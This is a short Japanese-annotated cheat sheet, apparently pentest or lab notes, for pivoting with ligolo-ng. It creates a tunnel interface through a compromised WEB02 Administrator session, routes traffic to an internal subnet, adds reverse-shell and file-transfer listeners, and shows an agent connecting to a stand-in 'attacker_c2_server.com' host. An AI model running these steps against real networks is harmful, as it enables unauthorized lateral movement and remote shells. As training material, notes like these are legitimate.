
### サーバ側
```sh

$ ./proxy -h # Help options
$ ./proxy -autocert # Automatically request LetsEncrypt certificates
$ ./proxy -selfcert # Use self-signed certificates

# トンネル用インターフェース作成
ligolo-ng » interface_create --name "evil-cha"
# INFO[0011] Creating a new "evil-cha" interface...       
# INFO[0011] Interface created!

# セッションを選択
ligolo-ng » session
# ? Specify a session : 1 - WEB02\Administrator@WEB02 - 192.168.104.121:59418 - 1e1288d9-086b-4d27-96a1-cab1fdb21c90

# ルートを設定
[Agent : WEB02\Administrator@WEB02] » route_add --name evil-cha --route 172.16.104.0/24
# INFO[15470] Route created.                               
[Agent : WEB02\Administrator@WEB02] » route_list
# ┌─────────────────────────────────────────────────┐
# │ Available tuntaps                               │
# ├───┬──────────┬──────────────────────────────────┤
# │ # │ TAP NAME │ DST ROUTES                       │
# ├───┼──────────┼──────────────────────────────────┤
# │ 0 │ tun0     │ 192.168.45.0/24,192.168.104.0/24 │
# │ 1 │ evil-cha │ 172.16.104.0/24                  │
# └───┴──────────┴──────────────────────────────────┘

# インターフェースを指定してスタート
[Agent : WEB02\Administrator@WEB02] » start --tun evil-cha
# [Agent : WEB02\Administrator@WEB02] » INFO[0961] Starting tunnel to WEB02\Administrator@WEB02 (1e1288d9-086b-4d27-96a1-cab1fdb21c90)


# ファイルを転送したり、リバースシェルを取るなど、様々な用途で通信経路を作るのに使えるが、用途別にリスナーを作って分けたほうがいい（らしい
# 踏み台端末のポート1235へのアクセスを自端末のポート80に転送する
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:80
# INFO[1080] Listener 0 created on remote agent!

# リバースシェル用
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:1234
# INFO[7758] Listener 1 created on remote agent!
```


### クライアント側
```sh
$ ./agent -connect attacker_c2_server.com:11601
./agent -connect 10.10.14.213:11601 -ignore-cert

```
